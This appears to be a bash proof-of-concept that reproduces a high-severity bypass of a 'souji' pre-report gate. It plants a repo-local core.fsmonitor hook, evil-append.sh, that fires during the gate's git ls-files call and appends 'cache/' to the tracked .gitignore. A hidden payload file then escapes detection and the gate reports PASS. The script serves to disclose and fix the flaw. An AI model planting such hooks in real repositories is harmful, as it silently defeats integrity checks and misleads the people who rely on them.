#!/usr/bin/env bash
# S76Sentinel HIGH-1 repro: the W gate block's own `git ls-files -z --cached` (no -c core.fsmonitor=false)
# runs a repo-local core.fsmonitor, which appends `cache/` to the tracked root .gitignore *after* the
# byte-truth check; check-ignore then attributes the hidden payload to that tracked file and the gate
# prints check-clean=PASS. Control run (same fixture, hook unset) prints RECEIPT-UNTRACKED-UNDECLARED-IGNORE: 2.
set -u
S=${S:-/fast/scratch/hyaku/souji-r76/S76Sentinel}
G=${G:-$S/G}                      # dir holding souji-pre-report-gate.sh + souji-receipt-write.py from e827d2bf
L=${L:-/home/vgpnk/Projects/shokunin/souji-shokunin}
mkdir -p "$S" || exit 1
REP=$S/report.md; PRE=$S/prereg.txt
printf '## SHONEN\nx\n' >"$REP"; printf 'prereg body\n' >"$PRE"

d=$(mktemp -d -p "$S" fx.XXXXXX) || exit 1
[ -n "$d" ] && [ -d "$d" ] || { echo EMPTY-FIXTURE-PATH >&2; exit 1; }
git -C "$d" init -q || exit 1
[ "$(git -C "$d" rev-parse --show-toplevel)" = "$d" ] || { echo TOPLEVEL-MISMATCH >&2; exit 1; }
printf 'base\n' >"$d/README.md"
printf '__pycache__/\n' >"$d/.gitignore"
git -C "$d" -c user.name=fx -c user.email=fx@fx add -A
git -C "$d" -c user.name=fx -c user.email=fx@fx commit -qm base
mkdir -p "$d/cache"; printf '*\n' >"$d/cache/.gitignore"; printf 'hidden payload\n' >"$d/cache/payload.bin"

run() { bash "$G/souji-pre-report-gate.sh" --lane "$d" --branch main --report "$REP" --prereg "$PRE" 2>&1 \
        | grep -E '^check-clean=|^detail-clean:' | cut -c1-150; }

echo "== control (no core.fsmonitor):"; run

cat >"$S/evil-append.sh" <<EOF
#!/bin/sh
p=\$(tr '\0' ' ' <"/proc/\$PPID/cmdline")
printf 'fired parent=%s\n' "\$p" >> "$S/fired.append"
case "\$p" in *--cached*) printf 'cache/\n' >> "$d/.gitignore" ;; esac
printf '2\n%s\0' "\$2"
exit 0
EOF
chmod +x "$S/evil-append.sh"
rm -f "$S/fired.append"
git -C "$d" config core.fsmonitor "$S/evil-append.sh"
echo "== armed (repo-local core.fsmonitor):"; run
echo "-- hook firings:"; sed 's/^/   /' "$S/fired.append"
echo "-- worktree .gitignore after the PASS: $(tr '\n' ' ' <"$d/.gitignore")"
echo "-- git status after the PASS: $(git -C "$d" status --porcelain=v1 -uall | tr '\n' ' ')"
echo "fixture=$d"
